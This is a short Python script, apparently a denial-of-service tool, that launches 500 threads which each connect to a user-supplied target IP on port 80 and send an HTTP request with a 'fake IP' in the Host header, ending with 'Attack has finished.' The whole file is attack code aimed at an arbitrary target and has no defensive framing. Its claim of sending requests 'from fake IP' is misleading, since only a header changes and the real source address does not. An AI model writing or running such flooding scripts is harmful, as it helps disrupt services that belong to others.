import socket
import threading

fake_ip = '182.21.20.32'
port = 80

def attack(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        response = s.recv(1024)
        print(f"Sent request to {target} from fake IP {fake_ip}")
        print(f"Status: {response.decode('utf-8').splitlines()[0]}")
        s.close()
    except:
        print(f"Failed to connect to {target}")

target = input("Enter the target IP: ")

threads = []

for i in range(500):
    thread = threading.Thread(target=attack, args=(target,))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

print("Attack has finished.")
